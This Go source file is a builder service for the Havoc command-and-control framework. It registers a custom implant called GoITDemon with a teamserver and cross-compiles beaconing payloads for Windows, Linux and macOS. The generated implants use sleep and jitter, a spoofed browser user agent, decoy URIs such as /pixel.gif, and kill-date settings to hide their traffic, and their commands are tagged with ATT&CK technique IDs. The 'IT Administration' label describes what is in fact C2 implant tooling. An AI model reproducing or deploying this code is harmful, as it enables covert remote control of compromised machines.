package main

import (
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/gorilla/websocket"
)

const (
	// GoITDemon service agent configuration
	AGENT_NAME        = "GoITDemon"
	AGENT_DESCRIPTION = "IT Administration focused Havoc Agent written in Go"
	AGENT_VERSION     = "1.0.0"
	MAGIC_VALUE       = "0x474f4954" // "GOIT" in hex
)

type ServiceAgent struct {
	Name           string                 `json:"Name"`
	Description    string                 `json:"Description"`
	Version        string                 `json:"Version"`
	MagicValue     string                 `json:"MagicValue"`
	Arch           []string               `json:"Arch"`
	Formats        []AgentFormat          `json:"Formats"`
	SupportedOS    []string               `json:"SupportedOS"`
	Commands       []AgentCommand         `json:"Commands"`
	BuildingConfig map[string]interface{} `json:"BuildingConfig"`
}

type AgentFormat struct {
	Name      string `json:"Name"`
	Extension string `json:"Extension"`
}

type AgentCommand struct {
	Name        string              `json:"Name"`
	Description string              `json:"Description"`
	Help        string              `json:"Help"`
	NeedAdmin   bool                `json:"NeedAdmin"`
	Mitr        []string            `json:"Mitr"`
	Params      []AgentCommandParam `json:"Params"`
	Anonymous   bool                `json:"Anonymous"`
}

type AgentCommandParam struct {
	Name       string `json:"Name"`
	IsFilePath bool   `json:"IsFilePath"`
	IsOptional bool   `json:"IsOptional"`
}

type BuildRequest struct {
	Head map[string]interface{} `json:"Head"`
	Body map[string]interface{} `json:"Body"`
}

type BuildResponse struct {
	Head map[string]interface{} `json:"Head"`
	Body map[string]interface{} `json:"Body"`
}

func main() {
	var (
		teamserverHost = flag.String("host", "127.0.0.1", "Teamserver host")
		teamserverPort = flag.String("port", "40056", "Teamserver port")
		password       = flag.String("password", "service-password", "Service password")
		endpoint       = flag.String("endpoint", "service-endpoint", "Service endpoint")
	)
	flag.Parse()

	// Connect to teamserver service endpoint
	url := fmt.Sprintf("wss://%s:%s/%s", *teamserverHost, *teamserverPort, *endpoint)

	log.Printf("[+] Connecting to teamserver at %s", url)

	// Create WebSocket dialer with TLS configuration for self-signed certificates
	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	conn, _, err := dialer.Dial(url, http.Header{})
	if err != nil {
		log.Fatalf("[-] Failed to connect to teamserver: %v", err)
	}
	defer conn.Close()

	// Authenticate with teamserver
	authMsg := map[string]interface{}{
		"Head": map[string]string{
			"Type": "Register",
		},
		"Body": map[string]string{
			"Name":     "GoITDemon-Service",
			"Password": *password,
		},
	}

	if err := conn.WriteJSON(authMsg); err != nil {
		log.Fatalf("[-] Failed to send auth message: %v", err)
	}

	// Register the GoITDemon agent
	agent := createGoITDemonAgent()
	registerMsg := map[string]interface{}{
		"Head": map[string]string{
			"Type": "RegisterAgent",
		},
		"Body": map[string]interface{}{
			"Agent": agent,
		},
	}

	if err := conn.WriteJSON(registerMsg); err != nil {
		log.Fatalf("[-] Failed to register agent: %v", err)
	}

	log.Printf("[+] Successfully registered %s agent", AGENT_NAME)
	log.Printf("[+] Listening for build requests...")

	// Listen for build requests
	for {
		var message map[string]interface{}
		err := conn.ReadJSON(&message)
		if err != nil {
			log.Printf("[-] Error reading message: %v", err)
			break
		}

		// Handle build requests
		if head, ok := message["Head"].(map[string]interface{}); ok {
			if head["Type"] == "Agent" {
				if body, ok := message["Body"].(map[string]interface{}); ok {
					if body["Type"] == "AgentBuild" {
						handleBuildRequest(conn, message)
					}
				}
			}
		}
	}
}

func createGoITDemonAgent() ServiceAgent {
	return ServiceAgent{
		Name:        AGENT_NAME,
		Description: AGENT_DESCRIPTION,
		Version:     AGENT_VERSION,
		MagicValue:  MAGIC_VALUE,
		Arch:        []string{"x64", "x86", "arm64"},
		Formats: []AgentFormat{
			{Name: "Linux Executable", Extension: ".elf"},
			{Name: "Windows Executable", Extension: ".exe"},
			{Name: "macOS Executable", Extension: ".macho"},
		},
		SupportedOS: []string{"Linux", "Windows", "macOS"},
		Commands: []AgentCommand{
			{
				Name:        "sysinfo",
				Description: "Get system information",
				Help:        "sysinfo [overview|environment|specs|uptime]",
				NeedAdmin:   false,
				Mitr:        []string{"T1082"},
				Params: []AgentCommandParam{
					{Name: "command", IsFilePath: false, IsOptional: true},
				},
				Anonymous: false,
			},
			{
				Name:        "service",
				Description: "Manage system services",
				Help:        "service [list|start|stop|restart|status] [service_name]",
				NeedAdmin:   true,
				Mitr:        []string{"T1543"},
				Params: []AgentCommandParam{
					{Name: "action", IsFilePath: false, IsOptional: false},
					{Name: "service_name", IsFilePath: false, IsOptional: true},
				},
				Anonymous: false,
			},
			{
				Name:        "netdiag",
				Description: "Network diagnostics",
				Help:        "netdiag [ping|dns|interfaces] [target]",
				NeedAdmin:   false,
				Mitr:        []string{"T1016"},
				Params: []AgentCommandParam{
					{Name: "command", IsFilePath: false, IsOptional: false},
					{Name: "target", IsFilePath: false, IsOptional: true},
				},
				Anonymous: false,
			},
			{
				Name:        "hwinfo",
				Description: "Hardware information",
				Help:        "hwinfo [cpu|memory|disk|all]",
				NeedAdmin:   false,
				Mitr:        []string{"T1082"},
				Params: []AgentCommandParam{
					{Name: "component", IsFilePath: false, IsOptional: true},
				},
				Anonymous: false,
			},
			{
				Name:        "syshealth",
				Description: "System health monitoring",
				Help:        "syshealth [cpu|memory|disk]",
				NeedAdmin:   false,
				Mitr:        []string{"T1082"},
				Params: []AgentCommandParam{
					{Name: "metric", IsFilePath: false, IsOptional: true},
				},
				Anonymous: false,
			},
		},
		BuildingConfig: map[string]interface{}{
			"Config": map[string]interface{}{
				"Sleep": map[string]interface{}{
					"type":        "input",
					"label":       "Sleep Time (seconds)",
					"placeholder": "5",
					"value":       "5",
				},
				"Jitter": map[string]interface{}{
					"type":        "input",
					"label":       "Jitter (%)",
					"placeholder": "10",
					"value":       "10",
				},
				"UserAgent": map[string]interface{}{
					"type":        "input",
					"label":       "User Agent",
					"placeholder": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
					"value":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
				},
				"KillDate": map[string]interface{}{
					"type":        "input",
					"label":       "Kill Date (YYYY-MM-DD HH:MM:SS)",
					"placeholder": "2024-12-31 23:59:59",
					"value":       "",
				},
				"WorkingHours": map[string]interface{}{
					"type":        "input",
					"label":       "Working Hours (HH:MM-HH:MM)",
					"placeholder": "08:00-17:00",
					"value":       "",
				},
			},
		},
	}
}

func handleBuildRequest(conn *websocket.Conn, message map[string]interface{}) {
	log.Printf("[+] Received build request")

	body := message["Body"].(map[string]interface{})
	clientID := body["ClientID"].(string)
	config := body["Config"].(map[string]interface{})
	options := body["Options"].(map[string]interface{})

	// Extract build parameters
	listener := options["Listener"].(map[string]interface{})
	arch := options["Arch"].(string)
	format := options["Format"].(string)

	log.Printf("[+] Building %s for %s (%s)", AGENT_NAME, arch, format)
	log.Printf("[+] Listener: %s", listener["Name"])

	// Build the agent
	payload, err := buildAgent(config, options)
	if err != nil {
		log.Printf("[-] Build failed: %v", err)
		sendBuildError(conn, clientID, err.Error())
		return
	}

	// Send the built payload back
	sendBuildSuccess(conn, clientID, payload, getFileName(arch, format))
}

func buildAgent(config, options map[string]interface{}) ([]byte, error) {
	// Get current working directory
	workDir := "/home/anoam/Havoc/payloads/GoITDemon"

	// Extract configuration
	listener := options["Listener"].(map[string]interface{})
	arch := options["Arch"].(string)
	format := options["Format"].(string)

	// Build target based on arch and format
	var (
		goos   string
		goarch string
		ext    string
	)

	switch format {
	case "Linux Executable":
		goos = "linux"
		ext = ""
	case "Windows Executable":
		goos = "windows"
		ext = ".exe"
	case "macOS Executable":
		goos = "darwin"
		ext = ""
	}

	switch arch {
	case "x64":
		goarch = "amd64"
	case "x86":
		goarch = "386"
	case "arm64":
		goarch = "arm64"
	default:
		goarch = "amd64"
	}

	// Create temporary build directory
	buildDir := filepath.Join(workDir, "build_temp")
	os.MkdirAll(buildDir, 0755)
	defer os.RemoveAll(buildDir)

	// Copy go.mod and go.sum to build directory
	srcGoMod := filepath.Join(workDir, "go.mod")
	srcGoSum := filepath.Join(workDir, "go.sum")
	dstGoMod := filepath.Join(buildDir, "go.mod")
	dstGoSum := filepath.Join(buildDir, "go.sum")

	// Copy go.mod
	if goModData, err := os.ReadFile(srcGoMod); err == nil {
		if err := os.WriteFile(dstGoMod, goModData, 0644); err != nil {
			return nil, fmt.Errorf("failed to copy go.mod: %v", err)
		}
	} else {
		return nil, fmt.Errorf("failed to read source go.mod: %v", err)
	}

	// Copy go.sum
	if goSumData, err := os.ReadFile(srcGoSum); err == nil {
		if err := os.WriteFile(dstGoSum, goSumData, 0644); err != nil {
			return nil, fmt.Errorf("failed to copy go.sum: %v", err)
		}
	}

	// Copy source files
	if err := copyDir(filepath.Join(workDir, "pkg"), filepath.Join(buildDir, "pkg")); err != nil {
		return nil, fmt.Errorf("failed to copy pkg directory: %v", err)
	}

	// Generate build-specific main.go with configuration
	mainContent := generateMainGo(config, listener)
	mainPath := filepath.Join(buildDir, "main.go")

	if err := os.WriteFile(mainPath, []byte(mainContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write main.go: %v", err)
	} // Build the binary
	outputName := fmt.Sprintf("GoITDemon_%s_%s%s", goos, goarch, ext)
	outputPath := filepath.Join(buildDir, outputName)

	cmd := exec.Command("go", "build", "-o", outputPath, ".")
	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("GOOS=%s", goos),
		fmt.Sprintf("GOARCH=%s", goarch),
		"CGO_ENABLED=0",
	)

	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("build failed: %v\nOutput: %s", err, string(output))
	}

	// Read the built binary
	payload, err := os.ReadFile(outputPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read built binary: %v", err)
	}

	log.Printf("[+] Successfully built %s (%d bytes)", outputName, len(payload))
	return payload, nil
}

func generateMainGo(config map[string]interface{}, listener map[string]interface{}) string {
	// Extract configuration values
	sleep := "5"
	jitter := "10"
	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

	if val, ok := config["Sleep"].(string); ok && val != "" {
		sleep = val
	}
	if val, ok := config["Jitter"].(string); ok && val != "" {
		jitter = val
	}
	if val, ok := config["UserAgent"].(string); ok && val != "" {
		userAgent = val
	}

	// Extract listener information - default to HTTPS listener
	hosts := "127.0.0.1"
	port := 443    // Default to HTTPS listener port
	secure := true // Default to HTTPS

	if val, ok := listener["Hosts"].([]interface{}); ok && len(val) > 0 {
		if host, ok := val[0].(map[string]interface{}); ok {
			if h, ok := host["Host"].(string); ok {
				hosts = h
			}
			if p, ok := host["Port"].(float64); ok {
				port = int(p)
			}
			// If connecting to a specific listener, use its security setting
			if s, ok := host["Secure"].(bool); ok {
				secure = s
			}
		}
	} else {
		// No specific listener configured, use teamserver defaults
		secure = true
	}

	if val, ok := listener["Secure"].(bool); ok {
		secure = val
	}

	return fmt.Sprintf(`package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"log"
	"runtime"
	"strconv"

	"github.com/HavocFramework/GoITDemon/pkg/agent"
	"github.com/HavocFramework/GoITDemon/pkg/commands"
	"github.com/HavocFramework/GoITDemon/pkg/transport"
)

const (
	// Agent identification
	AGENT_TYPE    = "GoITDemon"
	AGENT_VERSION = "1.0.0"
	MAGIC_VALUE   = 0x474f4954 // GOIT
)

func main() {
	// Initialize the IT Demon agent
	fmt.Printf("[+] Starting %%s v%%s\n", AGENT_TYPE, AGENT_VERSION)
	fmt.Printf("[+] Platform: %%s/%%s\n", runtime.GOOS, runtime.GOARCH)

	// Generate random agent ID
	agentID := generateAgentID()
	fmt.Printf("[+] Agent ID: %%08x\n", agentID)

	// Initialize transport with configuration
	transportConfig := &transport.Config{
		Method:    "POST",
		UserAgent: "%s",
		Hosts: []transport.Host{
			{Address: "%s", Port: %d, Secure: %t},
		},
		URIs: []string{
			"/fwlink",
			"/pixel.gif",
			"/updates",
			"/download",
		},
	}

	// Create transport instance
	trans, err := transport.NewHTTPTransport(transportConfig)
	if err != nil {
		log.Fatalf("[-] Failed to create transport: %%v", err)
	}

	// Initialize command handler
	cmdHandler := commands.NewHandler()

	// Parse configuration
	sleepTime, _ := strconv.Atoi("%s")
	jitterVal, _ := strconv.Atoi("%s")

	// Create agent instance
	agentInstance := &agent.Agent{
		ID:           agentID,
		Type:         AGENT_TYPE,
		Version:      AGENT_VERSION,
		MagicValue:   MAGIC_VALUE,
		Transport:    trans,
		CmdHandler:   cmdHandler,
		SleepTime:    sleepTime * 1000, // Convert to milliseconds
		Jitter:       jitterVal,
	}

	// Initialize agent
	if err := agentInstance.Initialize(); err != nil {
		log.Fatalf("[-] Failed to initialize agent: %%v", err)
	}

	// Start main agent loop
	fmt.Println("[+] Agent initialized, starting main loop...")
	agentInstance.Run()
}

func generateAgentID() uint32 {
	var id uint32
	binary.Read(rand.Reader, binary.LittleEndian, &id)
	return id
}`, userAgent, hosts, port, secure, sleep, jitter)
}

func getFileName(arch, format string) string {
	var ext string
	var os string

	switch format {
	case "Linux Executable":
		ext = ""
		os = "linux"
	case "Windows Executable":
		ext = ".exe"
		os = "windows"
	case "macOS Executable":
		ext = ""
		os = "macos"
	default:
		ext = ".bin"
		os = "unknown"
	}

	return fmt.Sprintf("GoITDemon_%s_%s%s", os, arch, ext)
}

func sendBuildSuccess(conn *websocket.Conn, clientID string, payload []byte, filename string) {
	// Base64 encode the payload
	encodedPayload := base64.StdEncoding.EncodeToString(payload)

	response := map[string]interface{}{
		"Head": map[string]string{
			"Type": "Agent",
		},
		"Body": map[string]interface{}{
			"Type":     "AgentBuild",
			"ClientID": clientID,
			"Message": map[string]interface{}{
				"FileName": filename,
				"Payload":  encodedPayload,
			},
		},
	}

	if err := conn.WriteJSON(response); err != nil {
		log.Printf("[-] Failed to send build success: %v", err)
	}
}

func sendBuildError(conn *websocket.Conn, clientID string, errorMsg string) {
	response := map[string]interface{}{
		"Head": map[string]string{
			"Type": "Agent",
		},
		"Body": map[string]interface{}{
			"Type":     "AgentBuild",
			"ClientID": clientID,
			"Error":    errorMsg,
		},
	}

	if err := conn.WriteJSON(response); err != nil {
		log.Printf("[-] Failed to send build error: %v", err)
	}
}

// copyDir recursively copies a directory
func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Calculate the destination path
		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		dstPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(dstPath, info.Mode())
		}

		// Copy file
		srcFile, err := os.Open(path)
		if err != nil {
			return err
		}
		defer srcFile.Close()

		if err := os.MkdirAll(filepath.Dir(dstPath), 0755); err != nil {
			return err
		}

		dstFile, err := os.Create(dstPath)
		if err != nil {
			return err
		}
		defer dstFile.Close()

		_, err = io.Copy(dstFile, srcFile)
		return err
	})
}
